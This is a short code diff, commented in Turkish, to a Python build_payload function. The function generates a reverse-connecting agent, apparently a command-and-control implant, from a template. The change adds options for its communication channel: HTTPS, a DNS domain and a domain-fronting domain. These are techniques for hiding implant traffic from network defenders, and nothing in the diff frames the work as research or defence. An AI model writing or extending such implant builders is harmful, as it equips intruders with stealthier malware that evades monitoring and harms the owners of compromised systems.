@@ -167,6 +167,9 @@ def build_payload(
     lport: int,
     reconnect_delay: int = 5,
     max_reconnect: int = -1,
+    channel_type: str = "https",
+    dns_domain: str = "",
+    fronting_domain: str = "",
     output_path: str = None,
     agent_source_path: str = None,
     strip_comments: bool = False,
@@ -280,6 +283,19 @@ def build_payload(
     agent_code = agent_code.replace(
         f"MAX_RECONNECT = -1",
         f"MAX_RECONNECT = {max_reconnect}"
+    )
+    # İletişim kanalı konfigürasyonları
+    agent_code = agent_code.replace(
+        'CHANNEL_TYPE = "{{CHANNEL_TYPE}}"',
+        f'CHANNEL_TYPE = "{channel_type}"'
+    )
+    agent_code = agent_code.replace(
+        'DNS_DOMAIN = "{{DNS_DOMAIN}}"',
+        f'DNS_DOMAIN = "{dns_domain}"'
+    )
+    agent_code = agent_code.replace(
+        'FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"',
+        f'FRONTING_DOMAIN = "{fronting_domain}"'
     )
 
     # --- Yorum satırlarını kaldır (opsiyonel) ---
